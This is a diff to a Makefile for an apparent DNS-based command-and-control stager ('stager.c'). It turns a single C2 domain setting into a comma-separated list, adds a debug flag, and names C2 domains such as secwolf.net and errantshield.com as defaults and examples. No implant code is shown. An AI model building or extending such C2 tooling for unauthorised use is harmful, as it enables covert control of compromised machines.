@@ -15,10 +15,11 @@ SRC = stager.c
 
 # Default DNS server (can be overridden)
 DNS_SERVER ?= 8.8.8.8
-C2_DOMAIN ?= secwolf.net
+C2_DOMAINS ?= secwolf.net
+DEBUG_MODE ?= 0
 
 # Build flags
-BUILD_FLAGS = -DDNS_SERVER=\"$(DNS_SERVER)\" -DC2_DOMAIN=\"$(C2_DOMAIN)\"
+BUILD_FLAGS = -DDNS_SERVER=\"$(DNS_SERVER)\" -DC2_DOMAINS=\"$(C2_DOMAINS)\" -DDEBUG_MODE=$(DEBUG_MODE)
 
 .PHONY: all clean linux windows x64
 
@@ -65,7 +66,9 @@ help:
 	@echo ""
 	@echo "Variables:"
 	@echo "  DNS_SERVER  - DNS server to query (default: 8.8.8.8)"
-	@echo "  C2_DOMAIN   - C2 domain name (default: secwolf.net)"
+	@echo "  C2_DOMAINS  - C2 domain name(s), comma-separated (default: secwolf.net)"
+	@echo "  DEBUG_MODE  - Enable verbose debug output: 0=off, 1=on (default: 0)"
 	@echo ""
 	@echo "Example:"
-	@echo "  make DNS_SERVER=1.1.1.1 C2_DOMAIN=example.com"
+	@echo "  make DNS_SERVER=1.1.1.1 C2_DOMAINS=example.com"
+	@echo "  make C2_DOMAINS=errantshield.com DEBUG_MODE=1 linux-x64"
